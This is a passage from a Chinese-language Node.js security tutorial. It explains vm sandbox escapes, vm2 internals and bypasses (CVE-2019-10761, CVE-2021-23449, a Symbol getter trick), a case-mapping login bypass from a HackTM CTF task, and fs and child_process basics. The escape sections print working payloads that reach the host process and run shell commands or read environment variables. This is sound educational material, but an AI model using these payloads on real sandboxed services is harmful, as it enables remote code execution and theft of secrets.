<p>下面这行代码也可以达到相同的效果：</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> y1 = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.toString.constructor('return process')()`</span>);</code></pre>
<p>然后我们就可以通过返回的process对象来rce了</p>
<pre><code class="hljs js">y1.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">'whoami'</span>).<span class="hljs-title function_">toString</span>()</code></pre>
<p>这里知识星球上提到了一个问题，下面这段代码：</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm'</span>);
<span class="hljs-keyword">const</span> script = <span class="hljs-string">`m + n`</span>;
<span class="hljs-keyword">const</span> sandbox = { <span class="hljs-attr">m</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">n</span>: <span class="hljs-number">2</span> };
<span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);
<span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res)</code></pre>
<p>我们能不能把<code>this.toString.constructor('return process')()</code>中的this换成{}呢？ {}的意思是在沙箱内声明了一个对象，也就是说这个对象是不能访问到global下的。</p>
<p>如果我们将this换成m和n也是访问不到的，因为数字，字符串，布尔这些都是primitive类型，他们在传递的过程中是将值传递过去而不是引用（类似于函数传递形参），在沙盒内使用的mn已经不是原来的mn了，所以无法利用。</p>
<p>我们将mn改成其他类型就可以利用了：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030205601565.png" alt="image-20231030205601565"></p>
<h2 id="65-vm沙箱逃逸的一些其他情况">6.5 vm沙箱逃逸的一些其他情况</h2>
<p>知识星球里提到了这样的情况：</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm'</span>);
<span class="hljs-keyword">const</span> script = <span class="hljs-string">`...`</span>;
<span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);
<span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);
<span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Hello '</span> + res)</code></pre>
<p>我们现在的this为null，并且也没有其他可以引用的对象，这时候想要逃逸我们要用到一个函数中的内置对象的属性<code>arguments.callee.caller</code>，它可以返回函数的调用者。</p>
<p>我们上面演示的沙箱逃逸其实就是找到一个沙箱外的对象，并调用其中的方法，这种情况下也是一样的，我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的<code>arguments.callee.caller</code>就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030210210157.png" alt="image-20231030210210157"></p>
<p>我们分析一下这段代码</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm'</span>);
<span class="hljs-keyword">const</span> script = 
<span class="hljs-string">`(() =&gt; {</span>
<span class="hljs-string">    const a = {}</span>
<span class="hljs-string">    a.toString = function () {</span>
<span class="hljs-string">      const cc = arguments.callee.caller;</span>
<span class="hljs-string">      const p = (cc.constructor.constructor('return process'))();</span>
<span class="hljs-string">      return p.mainModule.require('child_process').execSync('whoami').toString()</span>
<span class="hljs-string">    }</span>
<span class="hljs-string">    return a</span>
<span class="hljs-string">  })()`</span>;

<span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);
<span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);
<span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Hello '</span> + res)</code></pre>
<p>我们在沙箱内先创建了一个对象，并且将这个对象的toString方法进行了重写，通过<code>arguments.callee.caller</code>获得到沙箱外的一个对象，利用这个对象的构造函数的构造函数返回了process，再调用process进行rce，沙箱外在console.log中通过字符串拼接的方式触发了这个重写后的toString函数。</p>
<p>如果沙箱外没有执行字符串的相关操作来触发这个toString，并且也没有可以用来进行恶意重写的函数，我们可以用<code>Proxy</code>来劫持属性</p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844904090116292616">Proxy 和 Reflect - 掘金 (juejin.cn)</a></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030210240444.png" alt="image-20231030210240444"></p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">"vm"</span>);

<span class="hljs-keyword">const</span> script = 
<span class="hljs-string">`</span>
<span class="hljs-string">(() =&gt;{</span>
<span class="hljs-string">    const a = new Proxy({}, {</span>
<span class="hljs-string">        get: function(){</span>
<span class="hljs-string">            const cc = arguments.callee.caller;</span>
<span class="hljs-string">            const p = (cc.constructor.constructor('return process'))();</span>
<span class="hljs-string">            return p.mainModule.require('child_process').execSync('whoami').toString();</span>
<span class="hljs-string">        }</span>
<span class="hljs-string">    })</span>
<span class="hljs-string">    return a</span>
<span class="hljs-string">})()</span>
<span class="hljs-string">`</span>;
<span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);
<span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);
<span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">abc</span>)</code></pre>
<p>触发利用链的逻辑就是我们在<code>get:</code>这个钩子里写了一个恶意函数，当我们在沙箱外访问proxy对象的任意属性（不论是否存在）这个钩子就会自动运行，实现了rce。</p>
<p>如果沙箱的返回值返回的是我们无法利用的对象或者没有返回值应该怎么进行逃逸呢？</p>
<p>我们可以借助异常，将沙箱内的对象抛出去，然后在外部输出：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030210320245.png" alt="image-20231030210320245"></p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">"vm"</span>);

<span class="hljs-keyword">const</span> script = 
<span class="hljs-string">`</span>
<span class="hljs-string">    throw new Proxy({}, {</span>
<span class="hljs-string">        get: function(){</span>
<span class="hljs-string">            const cc = arguments.callee.caller;</span>
<span class="hljs-string">            const p = (cc.constructor.constructor('return process'))();</span>
<span class="hljs-string">            return p.mainModule.require('child_process').execSync('whoami').toString();</span>
<span class="hljs-string">        }</span>
<span class="hljs-string">    })</span>
<span class="hljs-string">`</span>;
<span class="hljs-keyword">try</span> {
    vm.<span class="hljs-title function_">runInContext</span>(script, vm.<span class="hljs-title function_">createContext</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>)));
}<span class="hljs-keyword">catch</span>(e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"error:"</span> + e) 
}</code></pre>
<p>这里我们用catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来。</p>
<h2 id="66-vm2">6.6 vm2</h2>
<p>通过上面几个例子可以看出来vm沙箱隔离功能较弱，有很多逃逸的方法，所以第三方包vm2在vm的基础上做了一些优化，我们看一下这些优化具体是怎么实现的。</p>
<p>安装vm2包：</p>
<pre><code class="hljs bash">npm install vm2</code></pre>
<p>整个vm2包下是这样的结构：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030210815548.png" alt="image-20231030210815548"></p>
<ul>
<li><code>cli.js</code>实现了可以在命令行中调用vm2 也就是bin下的vm2。</li>
<li><code>contextify.js</code>封装了三个对象：<code>Contextify Decontextify propertyDescriptor</code>，并且针对global的Buffer类进行了代理。</li>
<li><code>main.js</code> 是vm2执行的入口，导出了<code>NodeVM VM</code>这两个沙箱环境，还有一个<code>VMScript</code>实际上是封装了<code>vm.Script</code>。</li>
<li><code>sandbox.js</code>针对global的一些函数和变量进行了拦截，比如<code>setTimeout，setInterval</code>等</li>
</ul>
<p>vm2相比vm做出很大的改进，其中之一就是利用了es6新增的proxy特性，从而使用钩子拦截对<code>constructor和__proto__</code>这些属性的访问。</p>
<p>先用vm2演示一下：</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> {<span class="hljs-variable constant_">VM</span>, <span class="hljs-title class_">VMScript</span>} = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm2'</span>);

<span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VMScript</span>(<span class="hljs-string">"let a = 2;a;"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>((<span class="hljs-keyword">new</span> <span class="hljs-title function_">VM</span>()).<span class="hljs-title function_">run</span>(script));</code></pre>
<p><code>VM</code>是vm2在vm的基础上封装的一个虚拟机，我们只需要实例化后调用其中的run方法就可以运行一段脚本。</p>
<p>那么vm2在运行这两行代码时都做了什么事：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030210832366.png" alt="image-20231030210832366"></p>
<p>可以发现相比于vm的沙箱环境，vm2最重要的一步就是引入<code>sandbox.js</code>并针对context做封装。</p>
<p>那么vm2具体是怎么实现对context的封装？</p>
<p>vm2出现过多次逃逸的问题，所以现有的代码被进行了大量修改，为了方便分析需要使用较老版本的vm2，但github上貌似将3.9以前的版本全都删除了，所以我这里也找不到对应的资源了，代码分析也比较麻烦，直接移步链接：</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/207283#h2-1">vm2实现原理分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<h2 id="67-vm2中的沙箱绕过">6.7 vm2中的沙箱绕过</h2>
<h3 id="cve-2019-10761">CVE-2019-10761</h3>
<p>该漏洞要求vm2版本&lt;=3.6.10</p>
<pre><code class="hljs js"><span class="hljs-meta">"use strict"</span>;
<span class="hljs-keyword">const</span> {<span class="hljs-variable constant_">VM</span>} = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm2'</span>);
<span class="hljs-keyword">const</span> untrusted = <span class="hljs-string">`</span>
<span class="hljs-string">const f = Buffer.prototype.write;</span>
<span class="hljs-string">const ft = {</span>
<span class="hljs-string">        length: 10,</span>
<span class="hljs-string">        utf8Write(){</span>
<span class="hljs-string"></span>
<span class="hljs-string">        }</span>
<span class="hljs-string">}</span>
<span class="hljs-string">function r(i){</span>
<span class="hljs-string">    var x = 0;</span>
<span class="hljs-string">    try{</span>
<span class="hljs-string">        x = r(i);</span>
<span class="hljs-string">    }catch(e){}</span>
<span class="hljs-string">    if(typeof(x)!=='number')</span>
<span class="hljs-string">        return x;</span>
<span class="hljs-string">    if(x!==i)</span>
<span class="hljs-string">        return x+1;</span>
<span class="hljs-string">    try{</span>
<span class="hljs-string">        f.call(ft);</span>
<span class="hljs-string">    }catch(e){</span>
<span class="hljs-string">        return e;</span>
<span class="hljs-string">    }</span>
<span class="hljs-string">    return null;</span>
<span class="hljs-string">}</span>
<span class="hljs-string">var i=1;</span>
<span class="hljs-string">while(1){</span>
<span class="hljs-string">    try{</span>
<span class="hljs-string">        i=r(i).constructor.constructor("return process")();</span>
<span class="hljs-string">        break;</span>
<span class="hljs-string">    }catch(x){</span>
<span class="hljs-string">        i++;</span>
<span class="hljs-string">    }</span>
<span class="hljs-string">}</span>
<span class="hljs-string">i.mainModule.require("child_process").execSync("whoami").toString()</span>
<span class="hljs-string">`</span>;
<span class="hljs-keyword">try</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">VM</span>().<span class="hljs-title function_">run</span>(untrusted));
}<span class="hljs-keyword">catch</span>(x){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x);
}</code></pre>
<p>这个链子在p牛的知识星球上有，很抽象，沙箱逃逸说到底就是要从沙箱外获取一个对象，然后获得这个对象的constructor属性，这条链子获取沙箱外对象的方法是 在沙箱内不断递归一个函数，当递归次数超过当前环境的最大值时，我们正好调用沙箱外的函数，就会导致沙箱外的调用栈被爆掉，我们在沙箱内catch这个异常对象，就拿到了一个沙箱外的对象。举个例子：</p>
<p>假设当前环境下最大递归值为1000，我们通过程序控制递归999次（注意这里说的递归值不是一直调用同一个函数的最大值，而是单次程序内调用函数次数的最大值，也就是调用栈的最大值）：</p>
<pre><code class="hljs js"><span class="hljs-title function_">r</span>(i);      <span class="hljs-comment">// 该函数递归999次</span>

f.<span class="hljs-title function_">call</span>(ft);    <span class="hljs-comment">// 递归到第1000次时调用f这个函数，f为Buffer.prototype.write，就是下面图片的这个函数</span>

<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">utf8Write</span>()   <span class="hljs-comment">// 递归到1001次时为该函数，是一个外部函数，所以爆栈时捕捉的异常也是沙箱外，从而返回了一个沙箱                   外的异常对象</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030210859697.png" alt="image-20231030210859697"></p>
<h3 id="cve-2021-23449">CVE-2021-23449</h3>
<p>这个漏洞在snyk解释是原型链污染导致的沙箱逃逸，但p牛在知识星球里发了其实是另外的原因</p>
<p><a target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-JS-VM2-1585918">Sandbox Bypass in vm2 | CVE-2021-23449 | Snyk</a></p>
<p>poc：</p>
<pre><code class="hljs js"><span class="hljs-keyword">let</span> res = <span class="hljs-keyword">import</span>(<span class="hljs-string">'./foo.js'</span>)
res.<span class="hljs-property">toString</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">"return this"</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">process</span>.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">"child_process"</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">"whoami"</span>).<span class="hljs-title function_">toString</span>();</code></pre>
<p>import()在JavaScript中是一个语法结构，不是函数，没法通过之前对require这种函数处理相同的方法来处理它，导致实际上我们调用import()的结果实际上是没有经过沙箱的，是一个外部变量。 我们再获取这个变量的属性即可绕过沙箱。 vm2对此的修复方法也很粗糙，正则匹配并替换了\bimport\b关键字，在编译失败的时候，报Dynamic Import not supported错误。</p>
<h3 id="知识星球上的另外一个trick"><strong>知识星球上的另外一个trick</strong></h3>
<pre><code class="hljs js"><span class="hljs-title class_">Symbol</span> = {
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">toStringTag</span>(){
    <span class="hljs-keyword">throw</span> <span class="hljs-function"><span class="hljs-params">f</span>=&gt;</span>f.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">"return process"</span></span>)(<span class="hljs-params"></span>)
  }
};
<span class="hljs-keyword">try</span>{
  <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>());
}<span class="hljs-keyword">catch</span>(f){
  <span class="hljs-title class_">Symbol</span> = {};
  <span class="hljs-title function_">f</span>(<span class="hljs-function">()=&gt;</span>{}).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">"child_process"</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">"whoami"</span>).<span class="hljs-title function_">toString</span>();
}</code></pre>
<p>在vm2的原理中提到vm2会为对象配置代理并初始化，如果对象是以下类型：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030211017609.png" alt="image-20231030211017609"></p>
<p>就会return <code>Decontextify.instance</code> 函数，这个函数中用到了Symbol全局对象，我们可以通过劫持Symbol对象的getter并抛出异常，再在沙箱内拿到这个异常对象就可以了</p>
<h2 id="68-简单理解">6.8 简单理解</h2>
<p>vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸：</p>
<p>逃逸例子：</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">"vm"</span>);
<span class="hljs-keyword">const</span> env = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.constructor.constructor('return this.process.env')()`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(env);</code></pre>
<p>执行之后可以获取到主程序环境中的环境变量</p>
<p>上面例子的代码等价于如下代码：</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm'</span>);
<span class="hljs-keyword">const</span> sandbox = {};
<span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">"this.constructor.constructor('return this.process.env')()"</span>);
<span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);
env = script.<span class="hljs-title function_">runInContext</span>(context);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(env);</code></pre>
<p>创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。</p>
<p>因为<code>this.constructor.constructor</code>返回的是一个<code>Function constructor</code>，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是<code>return this.process.env</code>，结果是返回了主程序的环境变量。</p>
<p>配合<code>chile_process.exec()</code>就可以执行任意命令了：</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">"vm"</span>);
<span class="hljs-keyword">const</span> env = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`const process = this.constructor.constructor('return this.process')();</span>
<span class="hljs-string">process.mainModule.require('child_process').execSync('whoami').toString()`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(env);</code></pre>
<p>最近的mongo-express RCE(CVE-2019-10758)漏洞就是配合vm沙箱逃逸来利用的。</p>
<p>具体分析可参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7056">CVE-2019-10758:mongo-expressRCE复现分析</a></p>
<h2 id="69-javascript大小写特性">6.9 javascript大小写特性</h2>
<p>在javascript中有几个特殊的字符需要记录一下</p>
<p>对于toUpperCase():</p>
<pre><code class="hljs plaintext">字符"ı"、"ſ" 经过toUpperCase处理后结果为 "I"、"S"</code></pre>
<p>对于toLowerCase():</p>
<pre><code class="hljs plaintext">字符"K"经过toLowerCase处理后结果为"k"(这个K不是K)</code></pre>
<p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p>
<p>可参考p神的文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
<h2 id="610-ctf题实例-hacktm中的一道nodejs题">6.10 CTF题实例 - Hacktm中的一道Nodejs题</h2>
<p>题目部分源码：</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">isValidUser</span>(<span class="hljs-params">u</span>) {
  <span class="hljs-keyword">return</span> (
    u.<span class="hljs-property">username</span>.<span class="hljs-property">length</span> &gt;= <span class="hljs-number">3</span> &amp;&amp;
    u.<span class="hljs-property">username</span>.<span class="hljs-title function_">toUpperCase</span>() !== config.<span class="hljs-property">adminUsername</span>.<span class="hljs-title function_">toUpperCase</span>()
  );
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">isAdmin</span>(<span class="hljs-params">u</span>) {
  <span class="hljs-keyword">return</span> u.<span class="hljs-property">username</span>.<span class="hljs-title function_">toLowerCase</span>() == config.<span class="hljs-property">adminUsername</span>.<span class="hljs-title function_">toLowerCase</span>();
}</code></pre>
<p>解题时需要登录管理员的用户名，但是在登录时，<code>isValidUser</code>函数会对用户输入的用户名进行<code>toUpperCase</code>处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。</p>
<p>但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是<code>toLowerCase</code>。所以这两个差异，就可以使用大小写特性来进行绕过。</p>
<p>题目中默认的管理员用户名为：hacktm</p>
<p>所以，我们指定登录时的用户名为：hacKtm 即可绕过<code>isValidUser</code>和<code>isAdmin</code>的验证。</p>
<p>题目完整Writeup:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7177">HackTM中一道Node.js题分析(Draw with us)</a></p>
<h1 id="0x07-tips">0x07 Tips</h1>
<h2 id="71-fs-文件系统">7.1 fs 文件系统</h2>
<blockquote>
<p>fs 模块支持以标准 POSIX 函数建模的方式与文件系统进行交互。</p>
</blockquote>
<p>其中最简单的一个就是文件读取的操作</p>
<p>但是我们得分清楚</p>
<p><strong>同步和异步</strong></p>
<p>区别：</p>
<blockquote>
<p>同步阻塞：同步的 API 会阻止 Node.js 事件循环和进一步的 JavaScript 执行，直到操作完成。<br>
异步阻塞：对于一个 IO 操作，比如一个 ajax，当发出一个异步请求后，程序不会阻塞在那里等待结果的返回，而是继续执行下面的代码。</p>
</blockquote>
<p>当请求成功获取到结果后，就会调用回调函数来处理后面的事情，这个就是异步</p>
<p>简单但不完全正确的说：</p>
<blockquote>
<p>同异步与现实生活的方式相反，同步就是事一件一件做，做完一件再做下一件，而异步是同时开始。</p>
</blockquote>
<p>举个例子</p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);<span class="hljs-comment">//导入fs模块</span>
a = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">'./m1.txt'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-title function_">toString</span>());
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"结束!"</span>);</code></pre>
<p>这是同步，它的输出结果为</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030211700937.png" alt="image-20231030211700937"></p>
<p>很明显是等待每个操作完成，然后执行下一个操作</p>
<p>接下来是异步</p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);<span class="hljs-comment">//导入fs模块</span>
fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">'./m1.txt'</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">err, data</span>) {
    <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data.<span class="hljs-title function_">toString</span>());
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"------------------"</span>)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"现在才结束！"</span>)
});

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"结束？"</span>);</code></pre>
<p>这是就是异步，它的输出结果为</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030211817842.png" alt="image-20231030211817842"></p>
<p>异步从不等待每个操作完成，而是在第一步执行所有操作</p>
<h2 id="72-全局变量展开">7.2 全局变量展开</h2>
<ol>
<li>__dirname：当前模块的目录名。</li>
<li>__filename：当前模块的文件名。这是当前的模块文件的绝对路径（符号链接会被解析）。</li>
<li>exports 变量是默认赋值给 module.exports，它可以被赋予新值，它会暂时不会绑定到 module.exports。</li>
<li>module：在每个模块中， module 的自由变量是对表示当前模块的对象的引用。为方便起见，还可以通过全局模块的 exports</li>
<li>访问 module.exports。module 实际上不是全局的，而是每个模块本地的</li>
<li>require 模块就不多说了，用于引入模块、 JSON、或本地文件。可以从 node_modules 引入模块。</li>
</ol>
<p>我们常用的全局变量为<code>__dirname和__filename</code></p>
<h2 id="73-child_process">7.3 child_process</h2>
<p>child_process 提供了几种创建子进程的方式</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030211954466.png" alt="image-20231030211954466"></p>
<blockquote>
<p>异步方式：spawn、exec、execFile、fork<br>
同步方式：spawnSync、execSync、execFileSync</p>
</blockquote>
<p>经过上面的同步和异步思想的理解，创建子进程的同步异步方式应该不难理解。</p>
<p><strong>异步进程的创建</strong></p>
<ul>
<li>child_process.exec (): 衍生 shell 并在该 shell 中运行命令，完成后将 stdout 和 stderr<br>
传给回调函数。</li>
<li>child_process.execFile (): 与 child_process.exec ()<br>
类似，不同之处在于，默认情况下，它直接衍生命令，而不先衍生 shell。</li>
<li>child_process.fork (): 衍生新的 Node.js 进程并使用建立的 IPC<br>
通信通道（其允许在父子进程之间发送消息）调用指定的模块。</li>
<li>child_process.execSync (): child_process.exec () 的同步版本，其将阻塞 Node.js<br>
事件循环。</li>
<li>child_process.execFileSync (): child_process.execFile () 的同步版本，其将阻塞<br>
Node.js 事件循环。</li>
</ul>
<p><strong>同步进程的创建</strong><br>
